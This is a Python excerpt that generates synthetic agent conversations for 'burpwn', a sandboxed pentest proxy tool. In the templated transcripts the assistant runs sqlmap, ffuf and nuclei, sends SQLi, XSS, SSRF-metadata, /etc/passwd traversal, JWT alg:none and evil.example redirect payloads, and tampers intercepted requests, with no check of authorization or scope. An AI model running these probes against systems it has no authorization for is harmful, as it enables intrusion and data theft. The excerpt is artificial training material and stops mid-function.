                               "request": {"method": "GET", "authority": t.host, "path": "/"},
                               "response": {"status": 200,
                                            "headers": "content-type: text/html\r\n",
                                            "body": "<!doctype html>..."}},
                    "final": f"Flow {fid} is `GET {t.host}/` → 200 ({t.protocol}). The decoded "
                             "request/response are in `request`/`response`; pass `raw:true` "
                             "for the verbatim bytes.",
                }],
            )
        )
    return out


def fam_recon_flag_variants() -> list[dict[str, Any]]:
    """Same tools, but sweeping realistic flag/wordlist/output variations so the
    model sees the breadth of how a given tool is invoked under `exec`."""
    out: list[dict[str, Any]] = []
    variants = [
        ("ffuf",
         ["ffuf -u {base}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404",
          "ffuf -u {base}/api/FUZZ -w api-endpoints.txt -mc 200,401,403 -t 40",
          "ffuf -u {base}/ -w params.txt -X POST -d 'FUZZ=test' -mc 200",
          "ffuf -H 'Host: FUZZ.{host}' -u {base}/ -w subdomains.txt -fs 0"],
         600, "fuzz"),
        ("sqlmap",
         ["sqlmap -u '{base}/item?id=1' --batch --dbs",
          "sqlmap -u '{base}/login' --data 'user=a&pass=b' --batch --level 3 --risk 2",
          "sqlmap -u '{base}/api/search?q=1' --batch --technique=BEUST --dump",
          "sqlmap -r request.txt --batch --threads 4"],
         900, "test for SQLi"),
        ("nuclei",
         ["nuclei -u {base} -t cves/ -silent",
          "nuclei -u {base} -severity critical,high -silent",
          "nuclei -u {base} -tags exposure,misconfig -silent",
          "nuclei -l targets.txt -t http/ -rl 50 -silent"],
         300, "scan"),
        ("curl",
         ["curl -s -X OPTIONS -i {base}/api/users",
          "curl -s -H 'X-Forwarded-For: 127.0.0.1' {base}/admin",
          "curl -s --http2 -I {base}/",
          "curl -s -b 'session=abc' {base}/account"],
         60, "request"),
    ]
    phr = [
        "Run this {tool} command through burpwn: capture it.",
        "I need to {desc} {host} with a specific {tool} invocation — sandbox it.",
        "Wrap this {tool} run in burpwn exec against {host}.",
        "Capture this {tool} command's traffic on {host}.",
    ]
    for ti, t in enumerate(TARGETS):
        for vi, (tool, cmds, to, desc) in enumerate(variants):
            cmd = cmds[(ti) % len(cmds)].format(base=t.base, host=t.host)
            tc = f"--timeout {to} " if to >= 120 else ""
            out.append(
                cli_example(
                    tags=["exec", "recon", "flags", tool, t.key],
                    turns=[
                        ("user",
                         phr[(ti + vi) % len(phr)].format(tool=tool, host=t.host, desc=desc)
                         + f"\n\n`{cmd}`"),
                        ("assistant",
                         f"Run it inside the sandbox so the egress is captured:\n\n```\n"
                         f"burpwn exec {tc}-- {cmd}\n```\n\nEvery request it makes lands in "
                         f"the session store; review with `burpwn req list --host {t.host}`."),
                    ],
                )
            )
    return out


def fam_vuln_workflows_sweep() -> list[dict[str, Any]]:
    """Per (target, vuln) multi-turn workflows: probe -> capture -> inspect ->
    confirm -> tag/note. Distinct conversations, varied per target."""
    out: list[dict[str, Any]] = []
    specs = [
        ("sqli", "SQL injection", "/product?id=1",
         "curl -s \"{base}/product?id=1'\"",
         "a SQL syntax error in the body",
         "sqlmap -u '{base}/product?id=1' --batch"),
        ("xss", "reflected XSS", "/search?q=",
         "curl -s '{base}/search?q=probe9173'",
         "the marker reflected unencoded into the HTML/JS",
         None),
        ("idor", "IDOR", "/api/account/1001",
         "curl -s -H 'Authorization: Bearer $TOKEN' '{base}/api/account/1002'",
         "another user's account data returned with your token",
         None),
        ("ssrf", "SSRF", "/fetch?url=",
         "curl -s '{base}/fetch?url=http://169.254.169.254/latest/meta-data/'",
         "cloud metadata content in the response",
         None),
        ("jwt", "a JWT verification flaw", "/api/me",
         "curl -s -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.' '{base}/api/me'",
         "admin data returned for an alg:none unsigned token",
         None),
    ]
    wf_targets = [t for t in TARGETS if t.kind in ("webapp", "spa", "rest", "internal")]
    fid = 100
    for si, (vkey, vname, _ep, probecmd, signal, confirmcmd) in enumerate(specs):
        for ti, t in enumerate(wf_targets):
            fid += 1
            probe = probecmd.format(base=t.base)
            turns = [
                ("user", [
                    f"Let's test {t.host} for {vname}.",
                    f"Walk me through checking {t.host} for {vname}.",
                    f"I want to find {vname} on {t.host} — guide me.",
                ][(si + ti) % 3]),
                ("assistant",
                 f"Plan: send a probe through the sandbox, find the captured flow, inspect "
                 f"it, and confirm.\n\nStep 1 — probe:\n```\nburpwn exec -- {probe}\n```"),
                ("user", f"Captured as flow {fid}. What now?"),
                ("assistant",
                 f"Inspect the decoded response and look for {signal}:\n```\n"
                 f"burpwn req show {fid} --raw\n```\nAlso `burpwn --json req show {fid}` for "
                 "the structured view (status, headers, body)."),
                ("user", f"I see {signal}."),
                ("assistant",
                 (f"That confirms {vname}. " +
                  (f"Now exploit/confirm it at scale:\n```\nburpwn exec --timeout 900 -- "
                   f"{confirmcmd.format(base=t.base)}\n```\n" if confirmcmd else "") +
                  f"Record the finding:\n```\nburpwn tag add {fid} {vkey}\nburpwn note add "
                  f"{fid} \"confirmed {vname} on {t.host}\"\n```\nThen "
                  f"`burpwn export har -o {t.key}-{vkey}.har` for the report evidence.")),
            ]
            out.append(
                cli_example(
                    tags=["workflow", "multi-step", "sweep", vkey, t.key],
                    turns=turns,
                )
            )
    return out


def fam_mcp_tag_note_sweep() -> list[dict[str, Any]]:
    """MCP tag_add / note_add / match_replace_add / workspace_new sweep."""
    out: list[dict[str, Any]] = []
    vulns = ["sqli", "xss", "idor", "ssrf", "jwt", "csrf", "open-redirect", "lfi"]
    for i, v in enumerate(vulns):
        fid = 40 + i
        out.append(
            mcp_example(
                tags=["mcp", "tag_add", "sweep", v],
                user=f"Tag flow {fid} as {v}.",
                steps=[{
                    "tool": "tag_add", "args": {"flow_id": fid, "name": v},
                    "result": {"tag_id": i + 1},
                    "final": f"Flow {fid} tagged `{v}` (tag_id {i + 1}). MCP `tag_add` "
                             "returns just `{tag_id}`.",
                }],
            )
        )
        out.append(
            mcp_example(
                tags=["mcp", "note_add", "sweep", v],
                user=f"Note on flow {fid} that it shows {v}.",
                steps=[{
                    "tool": "note_add",
                    "args": {"flow_id": fid, "body": f"confirmed {v} on this flow"},
                    "result": {"note_id": i + 1},
                    "final": f"Note saved on flow {fid} (note_id {i + 1}). MCP arg is "
                             "`body`.",
                }],
            )
        )
    # match_replace_add variants (scope x kind x direction)
    mr = [
        ("", "header", "Authorization", "Bearer eyJ...", True, "inject auth on all requests"),
        ("*.acme.com", "body", "PRODUCTION", "STAGING", False, "rewrite responses for a host"),
        ("api.shopwave.io", "header", "X-Forwarded-For", "127.0.0.1", True, "spoof XFF"),
        ("", "url", "/v1/", "/internal/v1/", True, "rewrite the request path prefix"),
        ("", "host", "www.acme.com", "staging.acme.com", True, "swap the target host"),
    ]
    for i, (scope, kind, pat, repl, onreq, desc) in enumerate(mr):
        out.append(
            mcp_example(
                tags=["mcp", "match_replace_add", "sweep", kind],
                user=f"Add a match/replace rule to {desc}.",
                steps=[{
                    "tool": "match_replace_add",
                    "args": {"scope": scope, "kind": kind, "pattern": pat,
                             "replacement": repl, "on_request": onreq},
                    "result": {"id": i + 1},
                    "final": f"Rule {i + 1} added ({'request' if onreq else 'response'} side, "
                             f"kind `{kind}`, scope `{scope or 'all'}`). It applies while the "
                             "session daemon runs.",
                }],
            )
        )
    return out


def fam_mcp_intercept_sweep() -> list[dict[str, Any]]:
    """MCP intercept tamper chains across targets/methods."""
    out: list[dict[str, Any]] = []
    cases = [
        ("shopwave.io", "POST", "/cart/checkout",
         [{"name": "X-Admin", "value": "true"}], '{"item":"sku-9","qty":99}',
         "bump quantity and add an admin header"),
        ("app.fintrack.dev", "POST", "/api/transfer",
         [{"name": "X-Role", "value": "admin"}], '{"to":"acct-2","amount":1}',
         "change the role header and amount"),
        ("juice-shop.local", "PUT", "/api/Users/1",
         [], '{"role":"admin"}', "escalate the role in the body"),
        ("dvwa.local", "POST", "/vulnerabilities/csrf/",
         [{"name": "X-Requested-With", "value": "XMLHttpRequest"}], None,
         "add a header without touching the body"),
    ]
    for i, (host, method, path, headers, body, desc) in enumerate(cases):
        steps = [
            {"preamble": "Enable interception.", "tool": "intercept_enable", "args": {},
             "result": {"ok": True},
             "final": "Interception on. Long-polling for the next request."},
            {"preamble": "Await the next parked request.", "tool": "await_intercept",
             "args": {"timeout_secs": 60},
             "result": {"pending": True, "intercept": {"id": 1, "kind": "request",
                        "host": host, "method": method, "path": path}},
             "final": f"Parked intercept 1: `{method} {host}{path}`. I'll {desc} and "
                      "forward it."},
        ]
        fwd_args: dict[str, Any] = {"id": 1}
        if headers:
            fwd_args["set_headers"] = headers
        if body is not None:
            fwd_args["set_body"] = body
        steps.append({
            "preamble": "Forward with edits.", "tool": "intercept_forward",
            "args": fwd_args, "result": {"found": True},
            "final": f"Released intercept 1 ({desc}); `found:true`. The tampered request "
                     "reached the server and is captured — `req_list` for its response.",
        })
        out.append(
            mcp_example(
                tags=["mcp", "multi-step", "intercept", "tamper", "sweep"],
                user=f"Intercept the next {method} to {host}{path} and {desc}.",
                steps=steps,
            )
        )
    return out


def fam_mcp_exec_flag_variants() -> list[dict[str, Any]]:
    """MCP exec with specific multi-flag tool invocations (mirrors the CLI
    flag-variant family) — distinct argv arrays per target."""
    out: list[dict[str, Any]] = []
    variants = [
        ("ffuf", ["ffuf", "-u", "{base}/FUZZ", "-w", "raft-medium.txt", "-mc", "200,403"], 600),
        ("ffuf", ["ffuf", "-u", "{base}/api/FUZZ", "-w", "api.txt", "-mc", "200,401", "-t", "40"], 600),
        ("sqlmap", ["sqlmap", "-u", "{base}/item?id=1", "--batch", "--dbs"], 900),
        ("sqlmap", ["sqlmap", "-u", "{base}/login", "--data", "user=a&pass=b", "--batch", "--level", "3"], 900),
        ("nuclei", ["nuclei", "-u", "{base}", "-tags", "cve,exposure", "-silent"], 300),
        ("nuclei", ["nuclei", "-u", "{base}", "-severity", "critical,high", "-silent"], 300),
        ("curl", ["curl", "-s", "-X", "OPTIONS", "-i", "{base}/api/users"], 60),
        ("curl", ["curl", "-s", "-H", "X-Forwarded-For: 127.0.0.1", "{base}/admin"], 60),
        ("httpx", ["httpx", "-u", "{base}", "-sc", "-tech-detect", "-silent"], 120),
        ("nmap", ["nmap", "-sT", "-Pn", "-p", "80,443,8080,8443", "{host}"], 900),
    ]
    base = 200
    n = 0
    for ti, t in enumerate(TARGETS):
        for vi, (tool, argvpat, to) in enumerate(variants):
            argv = [a.format(base=t.base, host=t.host) for a in argvpat]
            args: dict[str, Any] = {"argv": argv}
            if to >= 120:
                args["timeout_secs"] = to
            ids = [base + n, base + n + 1]
            phr = [
                f"Run this {tool} invocation against {t.host} via the exec tool.",
                f"Use exec to drive {tool} with these flags on {t.host}.",
                f"Sandbox this {tool} command targeting {t.host}.",
            ][n % 3]
            out.append(
                mcp_example(
                    tags=["mcp", "exec", "flags", tool, t.key],
                    user=phr + f"\n\n`{' '.join(argv)}`",
                    steps=[{
                        "tool": "exec", "args": args,
                        "result": {"exit_code": 0, "captured_request_ids": ids,
                                   "exec_id": f"exec-f{ti}-{vi}-178141{ti}0000000000"},
                        "final": f"{tool} ran (`exit_code:0`); captured flows "
                                 f"{ids[0]}–{ids[-1]}. `req_list` with "
                                 f"`{{\"host\":\"{t.host}\"}}` to review the requests and "
                                 "responses.",
                    }],
                )
            )
            n += 1
    return out


# --------------------------------------------------------------------------- #
# Shell / Bash tool-call families (style "shell") + multi-turn conversations.
#
# These teach burpwn driven the way a real CLI agent (e.g. Claude Code, where the
# PreToolUse hook routes shell commands) actually uses it: the assistant emits a
# `Bash` tool call whose `command` runs burpwn, the `tool` turn carries the
# command's real stdout, and the assistant then interprets it. Most are genuine
# multi-turn conversations (several user turns, each driving one or more tool
# rounds). Grounded against the same real envelopes as the CLI/MCP families.
# --------------------------------------------------------------------------- #


def _flow_row(fid: int, t: Target, method: str, path: str, status: int) -> dict[str, Any]:
    """A `req list --json` row (bare-array element), matching fam_req_list."""
    return {
        "authority": t.host,
        "dst_ip": t.dst_ip,
        "dst_port": t.port,
        "id": fid,
        "intercepted": False,
        "method": method,
        "path": path,
        "protocol": t.protocol,
        "scheme": t.scheme,
        "sni": t.host if t.scheme == "https" else None,
        "status": status,
        "ts_end": 1781363726726,
        "ts_start": 1781363726697,
        "workspace_id": 1,
    }


def _idbase(t: Target) -> int:
    """Deterministic, target-distinct flow-id base so records don't collide."""
    return (TARGETS.index(t) + 1) * 7


def _ok(data: Any) -> str:
    """A CLI `--json` `{ok,data,error}` envelope, serialized as stdout."""
    return json.dumps({"ok": True, "data": data, "error": None}, sort_keys=True)


def _home_body(t: Target) -> str:
    if t.kind == "rest":
        return (
            f'{{"service":"{t.host}","version":"1.4.2",'
            '"endpoints":["/v1/login","/v1/me","/v1/users"]}'
        )
    if t.kind == "graphql":
        return '{"data":{"__typename":"Query"}}'
    if t.kind == "internal":
        return "<html><head><title>Intranet</title></head><body>Restricted area</body></html>"
    title = t.host
    return (
        f"<!doctype html><html><head><title>{title}</title></head>"
        '<body><h1>Welcome</h1><a href="/login">Sign in</a></body></html>'
    )


def fam_shell_recon() -> list[dict[str, Any]]:
    """Single-turn `Bash`-tool-call recon: run a tool under `burpwn exec`, read
    its stdout, then point at the capture. One per target + a few scanner forms."""
    out: list[dict[str, Any]] = []
    for t in TARGETS:
        out.append(
            shell_example(
                tags=["shell", "exec", "recon", "curl", t.key],
                exchanges=[
                    {
                        "user": f"Fetch the {t.host} homepage through burpwn so it gets captured.",
                        "steps": [
                            {
                                "preamble": "Running curl inside the sandbox so its egress is "
                                "forced through the MITM proxy and captured.",
                                "command": f"burpwn exec -- curl -s {t.base}/",
                                "result": _home_body(t),
                                "interp": f"That returned the {t.host} landing page; the GET "
                                "(plus its DNS lookups) are now in the session store. List them "
                                f"with `burpwn --json req list --host {t.host}`, then "
                                "`burpwn req show <id>` to read the decrypted exchange.",
                            }
                        ],
                    }
                ],
            )
        )
    # scanner forms (single tool call, long timeout) over a few targets
    scan_tools = [
        ("ffuf", "ffuf -u {base}/FUZZ -w /usr/share/wordlists/common.txt -mc 200,403", 600),
        ("nuclei", "nuclei -u {base} -silent", 300),
        ("nmap", "nmap -sT -Pn {host}", 300),
    ]
    for tool, cmdpat, to in scan_tools:
        for t in (TARGETS[0], TARGETS[2], TARGETS[7]):
            cmd = cmdpat.format(base=t.base, host=t.host)
            out.append(
                shell_example(
                    tags=["shell", "exec", "recon", "tool", tool, t.key],
                    exchanges=[
                        {
                            "user": f"Run {tool} against {t.host} through burpwn.",
                            "steps": [
                                {
                                    "preamble": f"Wrapping {tool} after `--` with a generous "
                                    "timeout; every probe it makes is captured.",
                                    "command": f"burpwn exec --timeout {to} -- {cmd}",
                                    "result": f"[{tool}] scan complete against {t.host}\n",
                                    "interp": f"{tool} finished; its requests are captured. "
                                    f"Triage the hits with `burpwn --json req list --host "
                                    f"{t.host} --status 200`.",
                                }
                            ],
                        }
                    ],
                )
            )
    return out


def fam_shell_recon_inspect() -> list[dict[str, Any]]:
    """Two-turn `Bash`-tool-call recon: run a tool under `exec`, then (second user
    turn) list and inspect what it captured."""
    out: list[dict[str, Any]] = []
    tools = [
        ("ffuf", "ffuf -u {base}/FUZZ -w /usr/share/wordlists/common.txt -mc 200,301", 600,
         "/admin", 301),
        ("gobuster", "gobuster dir -u {base} -w /usr/share/wordlists/common.txt", 600,
         "/backup", 200),
        ("nuclei", "nuclei -u {base} -silent", 300, "/.git/config", 200),
    ]
    for tool, cmdpat, to, hit_path, hit_status in tools:
        for t in TARGETS:
            b = _idbase(t)
            hit_id = b + 3
            rows = [_flow_row(hit_id, t, "GET", hit_path, hit_status)]
            out.append(
                shell_example(
                    tags=["shell", "exec", "recon", "inspect", "multi-turn", tool, t.key],
                    exchanges=[
                        {
                            "user": f"Run {tool} against {t.host} through burpwn.",
                            "steps": [
                                {
                                    "preamble": f"Wrapping {tool} after `--`; every probe is "
                                    "captured.",
                                    "command": f"burpwn exec --timeout {to} -- "
                                    + cmdpat.format(base=t.base),
                                    "result": f"[{tool}] done — interesting hit: {hit_path}\n",
                                    "interp": f"{tool} flagged `{hit_path}`. Its requests are "
                                    "captured — let me pull the hits from the store.",
                                }
                            ],
                        },
                        {
                            "user": f"Show me the {hit_path} hit it found.",
                            "steps": [
                                {
                                    "preamble": "Filter this host's captured flows.",
                                    "command": f"burpwn --json req list --host {t.host} "
                                    f"--status {hit_status}",
                                    "result": json.dumps(rows, sort_keys=True),
                                    "interp": f"Flow {hit_id} is the `GET {hit_path}` → "
                                    f"{hit_status}. Inspect the decrypted response with "
                                    f"`burpwn req show {hit_id} --raw`.",
                                }
                            ],
                        },
                    ],
                )
            )
    return out


def fam_shell_engagements() -> list[dict[str, Any]]:
    """Multi-turn engagement narratives over the `Bash` tool: session → recon →
    review captures → inspect a flow → flag/export. One per target × focus."""
    out: list[dict[str, Any]] = []
    focuses = [
        ("login", "/login", "POST", "the login endpoint",
         '{"error":"invalid_credentials"}'),
        ("api", "/v1/me", "GET", "the current-user endpoint",
         '{"id":1001,"email":"user@example.com","role":"user"}'),
        ("search", "/search?q=test", "GET", "the search endpoint",
         '{"results":[],"q":"test"}'),
        ("products", "/api/products?page=1", "GET", "the product listing",
         '{"items":[{"id":1,"name":"Widget"}],"page":1}'),
        ("profile", "/account/profile", "GET", "the account profile page",
         '{"username":"alice","email":"alice@example.com"}'),
        ("cart", "/api/cart", "GET", "the cart endpoint",
         '{"items":[],"total":0}'),
        ("health", "/healthz", "GET", "the health endpoint",
         '{"status":"ok","version":"1.4.2"}'),
    ]
    openers = [
        "Start testing {who}: create a session and hit {desc}.",
        "Spin up a fresh session for {who} and send a request to {desc}.",
        "New engagement on {who} — open a session and probe {desc}.",
    ]
    for t in TARGETS:
        for fkey, path, method, desc, body in focuses:
          for _oi, opener in enumerate(openers):
            b = _idbase(t)
            dns_id, http_id = b, b + 1
            sess = t.key
            list_rows = [
                _flow_row(dns_id, t, "QUERY", f"{t.host}./A", 0),
                _flow_row(http_id, t, method, path, 200),
            ]
            show_detail = {
                "id": http_id,
                "protocol": t.protocol,
                "request": {"method": method, "path": path,
                            "headers": {"host": t.host}},
                "response": {"status": 200, "headers": {"content-type": "application/json"},
                             "body": body},
            }
            out.append(
                shell_example(
                    tags=["shell", "engagement", "multi-turn", fkey, t.key],
                    exchanges=[
                        {
                            "user": opener.format(who=(t.desc or t.host), desc=desc),
                            "steps": [
                                {
                                    "preamble": "Create a named session for this engagement "
                                    "first.",
                                    "command": f"burpwn --json session new --name {sess}",
                                    "result": _ok({"name": sess}),
                                    "interp": f"Session `{sess}` created and active. Now I'll "
                                    "send the request through the sandbox.",
                                },
                                {
                                    "preamble": "Run the request under exec so it's captured "
                                    "and decrypted.",
                                    "command": f"burpwn exec -- curl -s -X {method} {t.base}{path}",
                                    "result": body,
                                    "interp": f"Got `{body}`. The exchange is captured under "
                                    f"`{sess}` — let me see the flow records.",
                                },
                            ],
                        },
                        {
                            "user": "What got captured so far?",
                            "steps": [
                                {
                                    "preamble": "List this host's flows, newest first.",
                                    "command": f"burpwn --json req list --host {t.host} --limit 20",
                                    "result": json.dumps(list_rows, sort_keys=True),
                                    "interp": f"Two flows: id {dns_id} (the DNS `QUERY`) and id "
                                    f"{http_id} (the `{method} {path}` → 200). I'll open the "
                                    "HTTP one.",
                                }
                            ],
                        },
                        {
                            "user": f"Show me flow {http_id} decoded.",
                            "steps": [
                                {
                                    "preamble": "Decode the request/response.",
                                    "command": f"burpwn req show {http_id} --json",
                                    "result": _ok(show_detail),
                                    "interp": f"`{method} {path}` returned 200 with body "
                                    f"`{body}`. Worth flagging for follow-up.",
                                }
                            ],
                        },
                        {
                            "user": "Flag it and save evidence.",
                            "steps": [
                                {
                                    "preamble": "Tag the flow.",
                                    "command": f"burpwn --json tag add {http_id} {fkey}-review",
                                    "result": _ok({"tag_id": 1}),
                                    "interp": f"Tagged flow {http_id} `{fkey}-review`.",
                                },
                                {
                                    "preamble": "Export the session as HAR for the report.",
                                    "command": f"burpwn export har -o /tmp/{sess}.har",
                                    "result": "",
                                    "interp": f"Wrote `/tmp/{sess}.har` (HAR 1.2) with the "
                                    "captured flows. Note `export pcap` is not implemented; HAR "
                                    "is the evidence format.",
                                },
                            ],
                        },
                    ],
                )
            )
    return out


def fam_shell_vuln_workflows() -> list[dict[str, Any]]:
    """Multi-turn vuln-testing conversations via the `Bash` tool, one per
    (vuln class × target × phrasing). Probe → review → confirm/replay → tag."""
    out: list[dict[str, Any]] = []

    # (key, tag, ask templates[], probe cmd builder, probe stdout, confirm step)
    def idor(t: Target) -> dict[str, Any]:
        b = _idbase(t)
        return {
            "key": "idor",
            "asks": [
                f"Check {t.host} for IDOR on the user object.",
                f"Is {t.host}'s /v1/users/{{id}} object-level access broken?",
            ],
            "probe_cmd": f"burpwn exec -- curl -s {t.base}/v1/users/1001 -H 'Authorization: Bearer t-user'",
            "probe_out": '{"id":1001,"email":"a@x.io","role":"user"}',
            "probe_interp": "Fetched my own object (id 1001). If I can read another id with the "
            "same token, it's IDOR. Let me try 1002.",
            "confirm_cmd": f"burpwn exec -- curl -s {t.base}/v1/users/1002 -H 'Authorization: Bearer t-user'",
            "confirm_out": '{"id":1002,"email":"victim@x.io","role":"user"}',
            "confirm_interp": "Confirmed IDOR: my user token read user 1002's record "
            "(`victim@x.io`). I'll flag the flow.",
            "flow_id": b + 1,
            "tag": "idor-confirmed",
        }

    def sqli(t: Target) -> dict[str, Any]:
        b = _idbase(t)
        return {
            "key": "sqli",
            "asks": [
                f"Test {t.host}'s id parameter for SQL injection.",
                f"Does {t.host} error on a single quote in ?id=?",
            ],
            "probe_cmd": f"burpwn exec -- curl -s \"{t.base}/item?id=1'\"",
            "probe_out": '{"error":"SQL syntax error near \'1\'\'\'"}',
            "probe_interp": "The single quote triggered a SQL syntax error — strong SQLi signal. "
            "Let me confirm the response was captured as a 500.",
            "confirm_cmd": f"burpwn --json req list --host {t.host} --status 500",
            "confirm_out": None,  # filled below to a flow array
            "confirm_interp": "Captured as a 500 with the SQL error in the body — injectable. "
            "I'll tag it and follow up with sqlmap under exec.",
            "flow_id": b + 1,
            "tag": "sqli-candidate",
        }

    def xss(t: Target) -> dict[str, Any]:
        b = _idbase(t)
        return {
            "key": "xss",
            "asks": [
                f"Check {t.host}'s search for reflected XSS.",
                f"Is the q parameter on {t.host} reflected unescaped?",
            ],
            "probe_cmd": f"burpwn exec -- curl -s \"{t.base}/search?q=<script>alert(1)</script>\"",
            "probe_out": '<html><body>No results for <script>alert(1)</script></body></html>',
            "probe_interp": "The payload is reflected unescaped in the HTML body — reflected XSS. "
            "Let me confirm via full-text search of the captured response.",
            "confirm_cmd": "burpwn req search '<script>alert(1)'",
            "confirm_out": None,  # flow_ids
            "confirm_interp": "The captured response contains the unescaped payload — confirmed "
            "reflected XSS. Tagging the flow.",
            "flow_id": b + 1,
            "tag": "xss-reflected",
        }

    def authz(t: Target) -> dict[str, Any]:
        b = _idbase(t)
        return {
            "key": "authz",
            "asks": [
                f"Does {t.host}'s /v1/me enforce auth, or does dropping the token still work?",
                f"Re-test {t.host}'s account endpoint without the Authorization header.",
            ],
            "probe_cmd": f"burpwn exec -- curl -s -o /dev/null -w '%{{http_code}}' {t.base}/v1/me -H 'Authorization: Bearer t-user'",
            "probe_out": "200",
            "probe_interp": "With a valid token it's 200 and the request is captured. Now I'll "
            "replay that captured flow with the Authorization header stripped.",
            "confirm_cmd": f"burpwn req replay {b + 1} --set-header 'Authorization: '",
            "confirm_out": None,  # replay envelope
            "confirm_interp": "Replayed without the token and still got 200 — broken "
            "authentication/authorization. Flagging it.",
            "flow_id": b + 1,
            "tag": "authz-bypass",
        }

    def ssrf(t: Target) -> dict[str, Any]:
        b = _idbase(t)
        return {
            "key": "ssrf",
            "asks": [
                f"Test {t.host}'s url= fetch parameter for SSRF.",
                f"Can {t.host}'s image proxy be pointed at the metadata endpoint?",
            ],
            "probe_cmd": f"burpwn exec -- curl -s \"{t.base}/fetch?url=http://169.254.169.254/latest/meta-data/\"",
            "probe_out": "iam/\nhostname\ninstance-id\n",
            "probe_interp": "The endpoint fetched the cloud metadata service and returned its "
            "index — server-side request forgery. Let me confirm the flow was captured.",
            "confirm_cmd": f"burpwn --json req list --host {t.host} --method GET",
            "confirm_out": None,
            "confirm_interp": "Captured: the request to the `url=` param reached 169.254.169.254 "
            "from the server. Confirmed SSRF — flagging it.",
            "flow_id": b + 1,
            "tag": "ssrf-confirmed",
        }

    def openredirect(t: Target) -> dict[str, Any]:
        b = _idbase(t)
        return {
            "key": "open-redirect",
            "asks": [
                f"Does {t.host}'s next= parameter allow an open redirect?",
                f"Check {t.host} login redirect for off-site redirection.",
            ],
            "probe_cmd": f"burpwn exec -- curl -s -o /dev/null -D - \"{t.base}/login?next=https://evil.example/\"",
            "probe_out": "HTTP/2 302 \r\nlocation: https://evil.example/\r\n",
            "probe_interp": "It 302s straight to the attacker-controlled host in `Location` — "
            "open redirect. Let me confirm via the captured flow.",
            "confirm_cmd": f"burpwn req show {b + 1} --json",
            "confirm_out": None,
            "confirm_interp": "The captured response is a 302 with `location: https://evil.example/` "
            "— confirmed open redirect. Tagging it.",
            "flow_id": b + 1,
            "tag": "open-redirect",
        }

    def pathtrav(t: Target) -> dict[str, Any]:
        b = _idbase(t)
        return {
            "key": "path-traversal",
            "asks": [
                f"Test {t.host}'s file= parameter for path traversal.",
                f"Can {t.host}'s download endpoint read /etc/passwd?",
            ],
            "probe_cmd": f"burpwn exec -- curl -s \"{t.base}/download?file=../../../../etc/passwd\"",
            "probe_out": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
            "probe_interp": "The response is the contents of /etc/passwd — path traversal / LFI. "
            "Let me confirm the captured response body.",
            "confirm_cmd": "burpwn req search 'root:x:0:0'",
            "confirm_out": None,
            "confirm_interp": "The captured response body contains `root:x:0:0` — confirmed path "
            "traversal. Flagging the flow.",
            "flow_id": b + 1,
            "tag": "path-traversal",
        }

    def jwtnone(t: Target) -> dict[str, Any]:
        b = _idbase(t)
        return {
            "key": "jwt-alg-none",
            "asks": [
                f"Check whether {t.host} accepts a JWT with alg:none.",
                f"Re-sign {t.host}'s token as alg:none and replay it.",
            ],
            "probe_cmd": f"burpwn exec -- curl -s -o /dev/null -w '%{{http_code}}' {t.base}/v1/me -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig'",
            "probe_out": "200",
            "probe_interp": "Baseline 200 with the signed token, and it's captured. Now I'll "
            "replay that flow swapping in an alg:none token.",
            "confirm_cmd": f"burpwn req replay {b + 1} --set-header 'Authorization: Bearer eyJhbGciOiJub25lIn0.payload.'",
            "confirm_out": None,
            "confirm_interp": "Replayed with an `alg:none` unsigned token and still got 200 — the "
            "server doesn't verify the signature. Critical auth bypass; flagging it.",
            "flow_id": b + 1,
            "tag": "jwt-alg-none",
        }

    builders = [idor, sqli, xss, authz, ssrf, openredirect, pathtrav, jwtnone]
    # vuln workflows over a spread of targets (skip pure-internal where odd)
    vuln_targets = [t for t in TARGETS if t.kind in ("rest", "webapp", "spa", "graphql")]
    for build in builders:
        for t in vuln_targets:
            spec = build(t)
            fid = spec["flow_id"]
            # fill the confirm result that depends on flow ids
            if spec["key"] == "sqli":
                spec["confirm_out"] = json.dumps(
                    [_flow_row(fid, t, "GET", "/item?id=1'", 500)], sort_keys=True
                )
            elif spec["key"] in ("xss", "path-traversal"):
                spec["confirm_out"] = json.dumps({"flow_ids": [fid]}, sort_keys=True)
            elif spec["key"] == "ssrf":
                spec["confirm_out"] = json.dumps(
                    [_flow_row(fid, t, "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", 200)],
                    sort_keys=True,
                )
            elif spec["key"] == "open-redirect":
                spec["confirm_out"] = _ok(
                    {"id": fid, "protocol": t.protocol,
                     "request": {"method": "GET", "path": "/login?next=https://evil.example/"},
                     "response": {"status": 302,
                                  "headers": {"location": "https://evil.example/"}, "body": ""}}
                )
            elif spec["key"] in ("authz", "jwt-alg-none"):
                spec["confirm_out"] = _ok(
                    {"response": "HTTP/2 200 \r\ncontent-type: application/json\r\n\r\n"
                                 '{"id":1001,"role":"user"}'}
                )
            asks = spec["asks"] + [
                f"Probe {t.host} for {spec['key']}, confirm it, and record the finding."
            ]
            for pi, ask in enumerate(asks):
                out.append(
                    shell_example(
                        tags=["shell", "vuln", "multi-turn", spec["key"], t.key],
                        exchanges=[
                            {
                                "user": ask.replace("{id}", "1001"),
                                "steps": [
                                    {
                                        "preamble": "Sending the probe through the sandbox so "
                                        "it's captured.",
                                        "command": spec["probe_cmd"],
                                        "result": spec["probe_out"],
                                        "interp": spec["probe_interp"],
                                    }
                                ],
                            },
                            {
                                "user": "Confirm it.",
                                "steps": [
                                    {
                                        "preamble": "Confirming against the captured evidence.",
                                        "command": spec["confirm_cmd"],
                                        "result": spec["confirm_out"],
                                        "interp": spec["confirm_interp"],
                                    }
                                ],
                            },
                            {
                                "user": "Tag the finding with a note.",
                                "steps": [
                                    {
                                        "preamble": "Tagging the flow.",
                                        "command": f"burpwn --json tag add {fid} {spec['tag']}",
                                        "result": _ok({"tag_id": 1}),
                                        "interp": f"Tagged flow {fid} `{spec['tag']}`.",
                                    },
                                    {
                                        "preamble": "Adding an evidence note.",
                                        "command": f"burpwn note add {fid} 'confirmed {spec['key']} on {t.host}'",
                                        "result": _ok({"note_id": 1}),
                                        "interp": f"Noted on flow {fid}. Evidence is in the "
                                        f"`{t.key}` capture set; `burpwn export har` when "
                                        "writing up.",
                                    },
                                ],
                            },
                        ],
                    )
                )
                _ = pi
    return out


def fam_mcp_conversations() -> list[dict[str, Any]]:
